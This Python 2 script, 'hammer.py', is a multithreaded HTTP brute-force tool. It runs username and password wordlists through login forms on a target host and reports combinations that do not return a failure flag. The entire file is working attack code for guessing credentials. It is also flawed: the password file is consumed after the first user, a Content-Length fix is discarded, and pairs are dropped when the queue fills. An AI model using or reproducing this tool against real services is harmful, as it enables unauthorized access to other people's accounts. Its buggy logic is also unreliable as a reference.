import getopt
import sys
import lib_TheardPool
import threading
import time
import socket
import ssl
import os
import re
#u user
#p pass
#ssl=t|f
#s (get|post):host:url:parameter:flag

config={'-u':None,'-p':None,'-s':None,'--ssl':-1,'ps':None,'-t':1,'-f':-1,'-a':-1,'-F':None,'fs':None,'port':None,'--plug':-1}
mylock=threading.RLock()

def parseargs():
    try:
        opts,args=getopt.getopt(sys.argv[1:],'ahfu:p:s:t:F:',['ssl','help','plug'])
    except Exception:
        Use()
    
    for key,value in opts:
        if key in ('-h','--help'):
            Use()
        config[key]=value
    if config['-s']:
        httpargs=config['-s'].split(':')
        if len(httpargs)<6:
            Use()
        config['ps']=httpargs
        if config['ps'][2]:
            config['port']=int(config['ps'][2])
        elif config['--ssl']!=-1:
            config['port']=443
        else:
            config['port']=80
            
    elif config['-F']:
        if not os.path.exists(config['-F']):
            print "Please input vaild file"
            Use()
        f=open(config['-F'])
        d=f.read()
        try:
            fs,head=d.split('\n',1)
            host,port,flag=fs.strip().split(':',2)
            if port:
                config['port']=int(port)
            elif config['--ssl']!=-1:
                config['port']=443
            else:
                config['port']=80         
            config['fs']={'host':host,'flag':flag,'head':head}
        except Exception:
            print "the content of input file is invaild"
            Use()
    else:
        Use()
        
    
    
def Use():
    print "hammer.py a brute force tool for http"
    print "hammer.py [-u,-p,-s,-h,--ssl,--help]"
    print "-u FILE ,user username dict"
    print "-p FILE ,user password dict"
    print "-t 1-100, thead numbers"
    print "-f exit if found vaild pair of user/pass"
    print "-s (get|post):host:port:url:post_data:flag of false"
    print "--ssl ,brute force use https"
    print "-F FILE ,request data and host file"
    print "-h,--help,display the help message"
    exit(1)


def display(msg):
    mylock.acquire()
    print msg
    mylock.release()

def connectsock(sock):
    try:
        sock.getsockname()
    except socket.error:
        if config['ps']:
            sock.connect((config['ps'][1],config['port']))
        elif config['fs']:
            sock.connect((config['fs']['host'],config['port']))

def brute4file(name,passwd,sock):
    rdata=config['fs']['head']
    if name:
        rdata=rdata.replace('^USER^',name)
    if passwd:
        rdata=rdata.replace('^PASS^',passwd)
    if config['-a']!=-1:
        head,post=rdata.split('\n\n')
        if head.find('Content-Length:')>0:
            re.sub(r'Content-Length: \d+','Content-Length: %d' %len(post),head)
        else:
            head+="\nContent-Length: %d" %len(post)
        rdata=head+'\n\n'+post
        
    try:
        connectsock(sock)
        if config['--plug']!=-1:
            import task
            task.start(config,sock)
            return
        sock.send(rdata)
    except Exception:
        print "Have error in brute4file %s,%s" %(name,passwd)
        return
    rs=sock.recv(4096)
    #display('test %s %s' %(name,passwd))
    if rs.find(config['fs']['flag'])<0:
        display("OK:%s %s" %(name,passwd))
    
def brute4args(name,passwd,sock):
    url=config['ps'][3]
    if name:
        url=url.replace('^USER^',name)
    if passwd:
        url=url.replace('^PASS^',passwd)
    data="%s %s HTTP/1.1\nHOST: %s\nConnection: keep-alive\n" %(config['ps'][0],url,config['ps'][1])
    if config['ps'][0]=='POST':
        postdata=config['ps'][4]
        if name:
            postdata=postdata.replace('^USER^',name)
        if passwd:
            postdata=postdata.replace('^PASS^',passwd)
        data+="Content-Type: application/x-www-form-urlencoded; charset=UTF-8\n"
        data+="Content-Length: %d\n\n" %len(postdata)+postdata
    
    try:
        connectsock(sock)
        sock.send(data)
    except Exception:
        print "Have error in brute4args %s,%s" %(name,passwd)
        return
    
    rs=sock.recv(4096)
    if rs.find(config['ps'][5])<0:
        display("OK:%s %s" %(name,passwd))
    
def main():
    if config['--ssl']==-1:
        pool=lib_TheardPool.threadpool(tmax=int(config['-t']),invrt=0.3,mnet='sock',debug=0)
    else:
        pool=lib_TheardPool.threadpool(tmax=int(config['-t']),invrt=0.3,mnet='sslsock',debug=0)
    uname=open(config['-u'])
    upass=open(config['-p'])
    for nameline in uname:
        name=nameline.strip()
        for passline in upass:
            passwd=passline.strip()
            if pool.queue.qsize()<1000:
                if config['ps']:
                    pool.addtask(brute4args,(name,passwd))
                elif config['fs']:
                    pool.addtask(brute4file,(name,passwd))
            else:
                time.sleep(5)
            
    
if __name__=="__main__":
    parseargs()
    #print config
    main()
    
    
    